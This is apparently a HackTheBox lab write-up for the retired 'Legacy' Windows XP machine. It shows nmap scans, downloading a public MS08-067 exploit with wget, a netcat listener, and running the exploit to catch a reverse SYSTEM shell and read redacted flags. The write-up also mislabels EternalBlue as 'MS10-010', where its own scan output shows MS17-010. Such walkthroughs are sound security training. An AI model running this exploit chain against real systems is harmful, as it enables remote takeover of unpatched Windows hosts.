---
layout: page
title: Legacy
description: Legacy from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/legacy/logo.png" title="HTB Legacy Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Legacy">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Thanks for coming back.  Still doing more boxes deep in the retired archives.

Kick-off by running nmap to discover all of the ports running on the server.

{% raw %}
```sh
└──╼ [★]$ nmap -sC -sV -A -O -oN nmap 10.10.10.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 06:51 CST
Nmap scan report for 10.10.10.4
Host is up (0.098s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

<snip>

```
{% endraw %}

<br />
Run the vulnerability category of nmap scripts to run all of the scripts class as vuln.  Notice that the SMB server is vulnerable to MS08-067.  It is also vulnerabile to Enternal Blue (MS10-010).

{% raw %}
```sh

<snip>

| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

<snip>

```
{% endraw %}

<br />
Google the MS08-067 and find the following exploit on the GitHub.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/legacy/exploit.png" title="Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://gist.github.com/jrmdev/5881544269408edde11335ea2b5438de">Jrmdev Gist</a>

<br />
Reviewing the exploit.  We need to install nclib for the best experience.  So, intall it.

{% raw %}
```sh
└──╼ [★]$ pip install nclib
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: nclib in /usr/local/lib/python3.11/dist-packages (1.0.5)

```
{% endraw %}

<br />
Download the python script into the local working folder.

{% raw %}
```sh
└──╼ [★]$ wget https://gist.githubusercontent.com/jrmdev/5881544269408edde11335ea2b5438de/raw/000546fe015a92e7837d4a82def7c90020d39b08/ms08-067.py
--2025-01-17 07:02:35--  https://gist.githubusercontent.com/jrmdev/5881544269408edde11335ea2b5438de/raw/000546fe015a92e7837d4a82def7c90020d39b08/ms08-067.py
Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7272 (7.1K) [text/plain]
Saving to: ‘ms08-067.py’

ms08-067.py                                     100%[=====================================================================================================>]   7.10K  --.-KB/s    in 0s      

2025-01-17 07:02:36 (50.3 MB/s) - ‘ms08-067.py’ saved [7272/7272]

```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```sh
└──╼ [★]$ sudo nc -nlvp 443
listening on [any] 443 ...

```
{% endraw %}

<br />
Execute the script.

<ul>
<li>Victim IP</li>
<li>Windows Type</li>
<li>Victim Port</li>
<li>Listener IP</li>
<li>Listener Port</li>
</ul>

{% raw %}
```sh
└──╼ [★]$ python ms08-067.py 10.10.10.4 6 445 10.10.14.29 443
                                                                                       
		@@@@@@@@@@    @@@@@@    @@@@@@@@    @@@@@@              @@@@@@@@     @@@@@@  @@@@@@@@  
		@@@@@@@@@@@  @@@@@@@   @@@@@@@@@@  @@@@@@@@            @@@@@@@@@@   @@@@@@@  @@@@@@@@  
		@@! @@! @@!  !@@       @@!   @@@@  @@!  @@@            @@!   @@@@  !@@            @@!  
		!@! !@! !@!  !@!       !@!  @!@!@  !@!  @!@            !@!  @!@!@  !@!           !@!   
		@!! !!@ @!@  !!@@!!    @!@ @! !@!   !@!!@!  @!@!@!@!@  @!@ @! !@!  !!@@!@!      @!!    
		!@!   ! !@!   !!@!!!   !@!!!  !!!   !!@!!!  !!!@!@!!!  !@!!!  !!!  @!!@!!!!    !!!     
		!!:     !!:       !:!  !!:!   !!!  !!:  !!!            !!:!   !!!  !:!  !:!   !!:      
		:!:     :!:      !:!   :!:    !:!  :!:  !:!            :!:    !:!  :!:  !:!  :!:       
		:::     ::   :::: ::   ::::::: ::  ::::: ::            ::::::: ::  :::: :::   ::       
		 :      :    :: : :     : : :  :    : :  :              : : :  :    :: : :   : :       
																							   
		
Windows XP SP3 English (NX)

[+] Generating shellcode ...
[+] Initiating connection ...
[+] Connected to ncacn_np:10.10.10.4[\pipe\browser]
[+] Setting up listener ...
Exception in thread Thread-2 (listen):
Traceback (most recent call last):
  File "/usr/lib/python3.11/threading.py", line 1038, in _bootstrap_inner
    self.run()
  File "/usr/lib/python3.11/threading.py", line 975, in run
    self._target(*self._args, **self._kwargs)
  File "/home/biscottidiskette/my_data/machines/legacy/ms08-067.py", line 61, in listen
    server = TCPServer((self.lhost, self.lport))
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.11/dist-packages/nclib/server.py", line 32, in __init__
    self.sock.bind(bindto)
OSError: [Errno 98] Address already in use

```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```sh
└──╼ [★]$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.4] 1032
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```sh
C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
<redacted>
C:\Documents and Settings\john\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

        Connection-specific DNS Suffix  . : 
        IP Address. . . . . . . . . . . . : 10.10.10.4
        Subnet Mask . . . . . . . . . . . : 255.255.254.0
        Default Gateway . . . . . . . . . : 10.10.10.2
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```sh
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
<redacted>
C:\Documents and Settings\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

        Connection-specific DNS Suffix  . : 
        IP Address. . . . . . . . . . . . : 10.10.10.4
        Subnet Mask . . . . . . . . . . . : 255.255.254.0
        Default Gateway . . . . . . . . . : 10.10.10.2
```
{% endraw %}

<br />
Another one down.  Look forward to seeing you in the next one.